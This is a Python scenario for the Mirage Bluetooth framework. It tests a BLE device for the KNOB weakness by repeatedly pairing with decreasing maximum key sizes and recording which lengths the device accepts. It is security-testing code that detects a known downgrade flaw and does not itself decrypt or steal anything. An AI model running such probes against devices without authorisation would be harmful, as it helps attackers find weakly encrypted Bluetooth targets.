from mirage.core import scenario
from mirage.libs import io, ble, utils
from mirage.libs.ble_utils.dissectors import *
from mirage.libs.ble_utils.sc_crypto import CryptoUtils


class ble_knob(scenario.Scenario):
    def onStart(self):
        self.useOOB = False
        self.checkMitm = False
        self.ioCapabilities = False
        self.justWorks = False

        self.tk = self.stk = b"\x00" * 16

        self.pairingRequest = None
        self.pairingResponse = None

        self.responderAddress = None
        self.responderAddressType = None
        self.initiatorAddress = None
        self.initiatorAddressType = None
        self.pReq = None
        self.pRes = None
        self.mRand = None
        self.sRand = None
        self.module.printScenarioStart("KNOB")
        # Success status of the scenario
        self.finished = False
        self.success = self.module.ScenarioResult.NOT

        self.initiatorAddress = None
        self.initiatorAddressType = None
        self.responderAddress = None
        self.responderAddressType = None

        self.results = [True for i in range(17)]
        self.currParams = {}
        for i in range(16, -1, -1):
            # Apply new address at each start
            self.module.a2sEmitter.setAddress(
                CryptoUtils.getRandomAddress(), random=True
            )

            # Connect on slave
            io.info("Connect on slave")
            self.module.setStage(self.module.BLEStage.WAIT_CONN)
            self.module.connectOnSlave()
            self.module.waitUntilStage(self.module.BLEStage.IDLE)
            self.currParams = {
                "keySize": i,
                "mitm": True,
                "bonding": True,
                "sc": self.module.args["SECURE_CONNECTION"],
            }
            self.pairingRequest = self.getPairingRequest(self.currParams)
            self.pReq = self.pairingRequest.payload[::-1]
            io.info("Try with keyLen = {}".format(self.currParams))
            self.module.setStage(self.module.BLEStage.CUSTOM1)
            self.module.a2sEmitter.sendp(self.pairingRequest)
            self.module.waitUntilStage(self.module.BLEStage.IDLE)

        self.minKeyLen = -1
        self.maxKeyLen = -1
        self.undefinedBahaviour = False
        for i in range(len(self.results)):
            if self.results[i] == self.module.ScenarioResult.VULN:
                if self.minKeyLen == -1:
                    self.maxKeyLen = i
                    self.minKeyLen = i
                else:
                    self.maxKeyLen = i
            elif self.results[i] == self.module.ScenarioResult.MAYBE:
                self.undefinedBahaviour = True
        if not self.undefinedBahaviour:
            self.finished = True
        if self.minKeyLen == 16:
            self.success = self.module.ScenarioResult.NOT
        elif self.minKeyLen >= 7:
            self.success = self.module.ScenarioResult.MAYBE
        else:
            self.success = self.module.ScenarioResult.VULN

        io.success(
            "Accepted key length in range {}-{} bytes".format(
                self.minKeyLen, self.maxKeyLen
            )
        )

        self.module.setStage(self.module.BLEStage.STOP)
        return True

    def getPairingRequest(self, params):
        keyboard = False
        yesno = False
        display = False

        ct2 = False
        mitm = params["mitm"]
        bonding = params["bonding"]
        secureConnections = params["sc"]
        keyPress = False

        self.initiatorInputOutputCapability = ble.InputOutputCapability(
            keyboard=keyboard, display=display, yesno=yesno
        )
        self.initiatorAuthReq = ble.AuthReqFlag(
            ct2=ct2,
            mitm=mitm,
            bonding=bonding,
            secureConnections=secureConnections,
            keypress=keyPress,
        )
        self.initiatorKeyDistribution = ble.KeyDistributionFlag(
            linkKey=True, encKey=True, idKey=False, signKey=True
        )

        return ble.BLEPairingRequest(
            authentication=self.initiatorAuthReq.data[0],
            inputOutputCapability=self.initiatorInputOutputCapability.data[0],
            initiatorKeyDistribution=self.initiatorKeyDistribution.data[0],
            responderKeyDistribution=self.initiatorKeyDistribution.data[0],
            maxKeySize=params["keySize"],
        )

    def onEnd(self, result):
        result["success"] = self.success
        result["finished"] = self.finished
        self.module.printScenarioEnd(result)
        return True

    def onKey(self, key):
        if key == "esc":
            self.module.setStage(self.module.BLEStage.STOP)
        return True

    def onSlaveConnectionComplete(self, packet):
        self.module.setStage(self.module.BLEStage.IDLE)
        return True

    def onSlaveDisconnect(self, packet):
        if self.module.getStage() == self.module.BLEStage.WAIT_CONN:
            self.module.connectOnSlave()
        else:
            self.module.setStage(self.module.BLEStage.IDLE)
        return False

    def onSlavePairingResponse(self, packet):
        auth = ble.AuthReqFlag(data=bytes([packet.authentication]))
        if auth.secureConnections:
            self.results[self.currParams["keySize"]] = self.module.ScenarioResult.VULN
            io.info("Slave accepted key length: {}".format(self.currParams))
            self.module.a2sEmitter.sendp(ble.BLEDisconnect())
        else:
            self.initiatorAddress = self.module.a2sEmitter.getAddress()
            self.initiatorAddressType = (
                b"\x00"
                if self.module.a2sEmitter.getAddressMode() == "public"
                else b"\x01"
            )
            self.responderAddress = self.module.a2sEmitter.getCurrentConnection()
            self.responderAddressType = (
                b"\x00"
                if self.module.a2sEmitter.getCurrentConnectionMode() == "public"
                else b"\x01"
            )

            self.pairingResponse = packet
            self.pRes = self.pairingResponse.payload[::-1]
            self.responderAuthReq = ble.AuthReqFlag(data=bytes([packet.authentication]))
            self.responderInputOutputCapability = ble.InputOutputCapability(
                data=bytes([packet.inputOutputCapability])
            )
            self.responderKeyDistribution = ble.KeyDistributionFlag(
                data=bytes([packet.responderKeyDistribution])
            )
            pairingMethod = self.pairingMethodSelection()
            io.info("Pairing Method selected : " + self.pairingMethod)

            self.mRand = ble.BLECrypto.generateRandom()
            io.info("Generating random : " + self.mRand.hex())

            pinCode = 0
            if pairingMethod != "JustWorks":
                pinCode = int(io.enterPinCode("Enter the 6 digit PIN code: "))

            self.tk = self.pinToTemporaryKey(pinCode)
            io.info("Generating Temporary Key : " + self.tk.hex())
            self.mConfirm = ble.BLECrypto.c1(
                self.tk,
                self.mRand[::-1],
                self.pReq,
                self.pRes,
                self.initiatorAddressType,
                self.initiatorAddress,
                self.responderAddressType,
                self.responderAddress,
            )
            io.info("Generating MConfirm : " + self.mConfirm.hex())
            confirmPacket = ble.BLEPairingConfirm(confirm=self.mConfirm[::-1])
            confirmPacket.show()
            self.module.a2sEmitter.sendp(confirmPacket)

    def onSlavePairingFailed(self, packet):
        if packet.reason == ble.SM_ERR_ENCRYPTION_KEY_SIZE:
            self.results[self.currParams["keySize"]] = self.module.ScenarioResult.NOT
            io.info("Slave rejected key length: {}".format(self.currParams))
            self.module.a2sEmitter.sendp(ble.BLEDisconnect())
        else:
            self.results[self.currParams["keySize"]] = self.module.ScenarioResult.MAYBE
            io.warning("Unexpected pairing failure reason...")
            self.module.pairingFailed(packet)
        io.info("Disconnect slave")
        self.module.a2sEmitter.sendp(ble.BLEDisconnect())

    def onSlavePairingConfirm(self, packet):
        self.results[self.currParams["keySize"]] = self.module.ScenarioResult.VULN
        io.info("Slave accepted key length: {}".format(self.currParams))
        self.module.a2sEmitter.sendp(ble.BLEDisconnect())

    def pairingMethodSelection(self):
        self.secureConnections = (
            self.responderAuthReq.secureConnections
            and self.initiatorAuthReq.secureConnections
        )
        self.useOOB = self.pairingRequest.outOfBand or self.pairingResponse.outOfBand
        self.ioCapabilities = self.responderAuthReq.mitm or self.initiatorAuthReq.mitm
        self.justWorks = (
            not self.responderAuthReq.mitm and not self.initiatorAuthReq.mitm
        )

        if self.ioCapabilities:
            initiator = "NoInputNoOutput"
            responder = "NoInputNoOutput"
            if self.initiatorInputOutputCapability.data[0] == 0x00:
                initiator = "DisplayOnly"
            elif self.initiatorInputOutputCapability.data[0] == 0x01:
                initiator = "DisplayYesNo"
            elif self.initiatorInputOutputCapability.data[0] == 0x02:
                initiator = "KeyboardOnly"
            elif self.initiatorInputOutputCapability.data[0] == 0x03:
                initiator = "NoInputNoOutput"
            elif self.initiatorInputOutputCapability.data[0] == 0x04:
                initiator = "KeyboardDisplay"

            if self.responderInputOutputCapability.data[0] == 0x00:
                responder = "DisplayOnly"
            elif self.responderInputOutputCapability.data[0] == 0x01:
                responder = "DisplayYesNo"
            elif self.responderInputOutputCapability.data[0] == 0x02:
                responder = "KeyboardOnly"
            elif self.responderInputOutputCapability.data[0] == 0x03:
                responder = "NoInputNoOutput"
            elif self.responderInputOutputCapability.data[0] == 0x04:
                responder = "KeyboardDisplay"

            pairingMethod = ble.PairingMethods.getPairingMethod(
                secureConnections=self.secureConnections,
                initiatorInputOutputCapability=initiator,
                responderInputOutputCapability=responder,
            )

            if pairingMethod == ble.PairingMethods.JUST_WORKS:
                self.pairingMethod = "JustWorks"
            elif pairingMethod == ble.PairingMethods.PASSKEY_ENTRY:
                self.pairingMethod = "PasskeyEntry"
            elif pairingMethod == ble.PairingMethods.NUMERIC_COMPARISON:
                self.pairingMethod = "NumericComparison"
            else:
                self.pairingMethod = "JustWorks"
        elif self.useOOB:
            self.pairingMethod = "OutOfBonds"
        else:
            self.pairingMethod = "JustWorks"

        return self.pairingMethod

    def pinToTemporaryKey(self, pin):
        hexn = hex(pin)[2:]
        tk = bytes.fromhex((32 - len(hexn)) * "0" + hexn)
        return tk
